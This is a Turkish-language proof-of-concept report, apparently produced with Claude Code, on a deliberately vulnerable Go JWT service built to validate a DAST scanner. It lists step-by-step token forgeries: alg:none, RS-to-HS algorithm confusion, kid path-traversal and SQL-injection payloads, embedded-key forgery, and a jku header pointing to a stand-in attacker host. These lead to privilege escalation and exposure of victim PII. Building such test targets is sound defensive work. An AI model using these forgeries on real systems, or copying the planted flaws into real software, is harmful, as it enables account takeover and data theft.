# SecMan — Bilerek Yerleştirilmiş JWT Zafiyetleri · PoC Raporu

| | |
|---|---|
| **Hedef** | (SecMan), Go 1.22 / Gin |
| **Amaç** | crAPI'de **izole edilemeyen / tarayıcının kaçırdığı** JWT zafiyetlerini, canlı ve **izole doğrulanabilir** bir hedefte bilerek üretmek |
| **Branch** | `vuln` |
| **Durum** | Uygulandı + birim testleriyle 8 forge vektörü kanıtlandı (`go test ./services/vulnjwt/` → PASS) |

> ⚠️ **UYARI:** `services/vulnjwt` paketi ve `/api/v1/vuln/*` route'ları **kasıtlı olarak zafiyetlidir**.
> Yalnız DAST worker'ının JWT test setini doğrulamak içindir. Production'a gitmemelidir.

---

## 0. Neden Bu Tasarım — crAPI Blind-Spot'larının Karşılığı

Master plan'daki (`JWT_DAST_FalsePositive_MasterPlan.md`) izolasyon matrisine göre crAPI'de:

| crAPI vektörü | crAPI verdict | SecMan'de karşılığı |
|---|---|---|
| Algorithm Confusion (RS→HS) | **FALSE-POSITIVE** (izole çalışmadı — servisler HS256'yı tümden reddediyordu) | **VULN-03** — izole çalışıyor |
| KID path traversal / injection | **FALSE-POSITIVE** (dev/null+AA== hepsi 401) | **VULN-04a/b/c** — izole çalışıyor |
| JKU misuse | **GERÇEK ama scanner BLIND-SPOT** (OOB kapalıydı) | **VULN-06** — izole çalışıyor |
| Embedded-key (jwk/x5c) | crAPI'de dashboard no-verification gölgesinde | **VULN-05** — izole çalışıyor |

**İzolasyon garantisi:** Baseline gerçek RS256 imzayla **200**, negative control (bozuk imza) **401** döner.
Yani sunucu imzayı *gerçekten* doğrular; her forge vektörü bu doğrulamayı ayrı bir kök nedenle atlar —
crAPI dashboard'undaki "blanket no-verification" gölgesi burada YOKTUR.

---

## 1. Zafiyet Haritası — Hangi Zafiyet, Hangi Dosya, Kaçıncı Satır

| # | Zafiyet | crAPI test # | Dosya | Satır | Etiket |
|---|---------|:---:|-------|:---:|--------|
| 1 | **alg:none** — imza segmenti hiç kontrol edilmez | 1 | `services/vulnjwt/verify.go` | **104-107** | `VULN-01` |
| 2 | **alg allow-list yok** — `alg` header'ına güven | 1-6 | `services/vulnjwt/verify.go` | **80-82** | `VULN-02` |
| 3 | **Algorithm Confusion** (RSA pub key = HMAC secret, 4 varyant) | 2 | `services/vulnjwt/verify.go` | **159-167** + `algConfusionSecrets()` **200-213** | `VULN-03` |
| 3b | **Weak HMAC secret** (sözlük) | 1 | `services/vulnjwt/verify.go` | **169-175** | `VULN-03b` |
| 4a | **kid path traversal** → boş anahtar | 4 | `services/vulnjwt/keystore.go` | **92-98** | `VULN-04a` |
| 4b | **kid SQL injection** → saldırgan anahtarı | 4 | `services/vulnjwt/keystore.go` | **100-114** | `VULN-04b` |
| 4c | **kid-as-key** — kid değeri = HMAC anahtarı | 4 | `services/vulnjwt/keystore.go` | **116-118** | `VULN-04c` |
| 5 | **Embedded-key forgery** (header.jwk / x5c) | 5 | `services/vulnjwt/verify.go` | **129-148** (`rsaFromJWK` **219-240**, `rsaFromX5C` **242-262**) | `VULN-05` |
| 6 | **jku / x5u SSRF + attacker key** | 15 / 3 | `services/vulnjwt/verify.go` | **109-127** (`fetchRSAFromJKU` **264-279**, `fetchRSAFromX5U` **281-298**) | `VULN-06` |
| 7 | **exp / nbf / iat doğrulaması yok** | 9 | `services/vulnjwt/verify.go` | **189-191** (üretim: `sign.go` **27**) | `VULN-07` |
| 8 | **aud / iss doğrulaması yok** | 8 | `services/vulnjwt/verify.go` | **189-191** | `VULN-08` |
| 9 | **typ / cty tip doğrulaması yok** (nested JWT unwrap) | 6 | `services/vulnjwt/verify.go` | **92-100** | `VULN-09` |
| 10 | **Privilege escalation** — role claim'ine güven | 10 | `controller/vulnJWTController.go` | **110-113** | `VULN-10` |
| 12 | **Subject confusion → BOLA** — sub claim = nesne anahtarı | 12 | `controller/vulnJWTController.go` | **97-102** | `VULN-12` |
| 13 | **Tenant isolation bypass → BOLA** | 13 | `controller/vulnJWTController.go` | **123-130** | `VULN-13` |
| 16 | **Passive audit** — PII payload'da + jti yok + 7 gün ömür | 16 | `services/vulnjwt/sign.go` | **22, 27, 28** | `VULN-16` |

---

## 2. Endpoint Yüzeyi

| Method | Path | İşlev |
|---|---|---|
| POST | `/api/v1/vuln/login` | Baseline RS256 token al (`{"email":"attacker@secman.io"}`) |
| GET | `/.well-known/jwks.json` | RS256 public key (algorithm-confusion kaynağı) |
| GET | `/api/v1/vuln/profile` | Subject-confusion BOLA (`sub` claim'ine göre veri) |
| GET | `/api/v1/vuln/admin` | Privilege escalation (`role` claim'ine göre) |
| GET | `/api/v1/vuln/tenant` | Tenant isolation BOLA (`tenant_id` claim'ine göre) |

Demo kimlikler: `attacker@secman.io` (user, t-001), `victim@secman.io` (user, t-002, PII: ssn/salary), `admin@secman.io` (admin, t-000).

---

## 3. PoC — Adım Adım Exploit

### 3.0 Baseline + Negative Control (izolasyon kanıtı)
```bash
# 1) Saldırgan kendi token'ını alır
TOK=$(curl -s localhost:4040/api/v1/vuln/login -d '{"email":"attacker@secman.io"}' | jq -r .token)

# 2) Baseline -> 200 (kendi profili)
curl -s localhost:4040/api/v1/vuln/profile -H "Authorization: Bearer $TOK"

# 3) Negative control: imzanın son 4 baytını boz -> 401
curl -s -o /dev/null -w "%{http_code}\n" localhost:4040/api/v1/vuln/profile \
     -H "Authorization: Bearer ${TOK%????}AAAA"
```
`200` + `401` → sunucu imzayı gerçekten doğruluyor. Aşağıdaki her forge bu doğrulamayı atlar.

### 3.1 VULN-01 · alg:none
Header `{"alg":"none"}`, imza boş, `sub` kurbana çekilir:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<payload:sub=victim@secman.io>.
```
→ `/api/v1/vuln/profile` **200** + kurbanın PII'si (ssn/salary).

### 3.2 VULN-03 · Algorithm Confusion (crAPI'de FALSE-POSITIVE idi)
```bash
# JWKS'ten public key'i al, PEM'e çevir, HMAC secret olarak kullan
curl -s localhost:4040/.well-known/jwks.json          # n,e -> PEM
# HS256 token = HMAC-SHA256(header.payload, <PEM public key bytes>)
```
Header `{"alg":"HS256"}`, secret = RSA public key PEM baytları → **200**.
`services/vulnjwt/verify.go:159` HS256 dalına düşer, `algConfusionSecrets()` (satır 200) PEM/DER/base64 varyantlarını dener.

### 3.3 VULN-04 · kid Injection (crAPI'de FALSE-POSITIVE idi)
```
# 4a empty-key:  kid = "../../../dev/null"   -> anahtar = ""      (boş string ile HMAC imzala)
# 4b SQLi:       kid = "x' UNION SELECT 'attacker_secret' --"     (secret = attacker_secret)
# 4c kid-as-key: kid = "known-kid-value"      -> anahtar = kid değeri
```
Üçü de → **200**. Kaynak: `services/vulnjwt/keystore.go:resolveKidKey` (92-118).

### 3.4 VULN-05 · Embedded-Key Forgery (jwk)
Saldırgan kendi RSA çiftini üretir, public key'i header'a `jwk` olarak gömer, **kendi private key'iyle** RS256 imzalar → `verify.go:129` gömülü anahtarla doğrular → **200**.

### 3.5 VULN-06 · jku SSRF + Attacker Key (crAPI'de scanner BLIND-SPOT idi)
```
header.jku = "http://attacker-oob.example.com:9999/jwks.json"
```
Sunucu bu URL'i **allow-list olmadan** fetch eder (`verify.go:264 fetchRSAFromJKU`):
- OOB collaborator'da DNS/HTTP callback → **Blind SSRF** kanıtı.
- Saldırgan kendi JWKS'ini sunarsa, kendi private key imzası kabul edilir → imza-bypass.
`x5u` için `verify.go:281`.

### 3.6 VULN-07/08 · exp / aud / iss doğrulanmaz
Geçerli RS256 imzalı ama `exp` geçmişte / `aud`,`iss` yanlış token → **200**.
Doğrulayıcı imza sonrası hiçbir claim kontrolü yapmaz (`verify.go:189` notu).

### 3.7 VULN-10 · Privilege Escalation
`role` claim'ini `admin` yapıp yeniden imzala (alg:none / confusion / kid ile) →
`/api/v1/vuln/admin` **200** + tüm kullanıcılar. Baseline (role=user) → 403. Kaynak: `controller/vulnJWTController.go:110`.

### 3.8 VULN-12/13 · BOLA (subject / tenant confusion)
- `sub=victim@secman.io` → `/profile` kurbanın ssn/salary'si (`vulnJWTController.go:97`).
- `tenant_id=t-002` → `/tenant` kurban tenant'ın tüm kayıtları (`vulnJWTController.go:123`).
Baseline'da (kendi sub/tenant) kurban verisi görünmez → gerçek BOLA, plain-BOLA değil.

### 3.9 VULN-16 · Passive Decode Audit
Login token'ı decode edilince: `email` (PII) payload'da, `jti` yok, `exp-iat = 7 gün` (>24s aşırı ömür). Kaynak: `services/vulnjwt/sign.go:22,27,28`.

---

## 4. Doğrulama Kanıtı (birim testi)

```
`verify_test.go` şunları kanıtlar: baseline **kabul**, negative control **ret**, ve
VULN-01, 03, 03b, 04a/b/c, 05, 07 forge vektörlerinin **hepsi kabul** ediliyor.

---

## 5. Eklenen/Değişen Dosyalar

| Dosya | Rol |
|---|---|
| `services/vulnjwt/keystore.go` | RSA anahtar, JWKS, kid→anahtar (path/SQLi/kid-as-key) |
| `services/vulnjwt/verify.go` | Zafiyetli doğrulayıcı (VULN-01..09) |
| `services/vulnjwt/sign.go` | Baseline RS256 token üretici (VULN-07/16) |
| `services/vulnjwt/verify_test.go` | 8 forge vektörünün kanıt testi |
| `controller/vulnJWTController.go` | Endpoint'ler + auth middleware (VULN-10/12/13) |
| `routes/vuln_routes.go` | Route kaydı |
| `main.go` | `vulnjwt.InitKeys()` + `routes.VulnJWTRoutes(router)` |

🤖 Generated with [Claude Code](https://claude.com/claude-code)
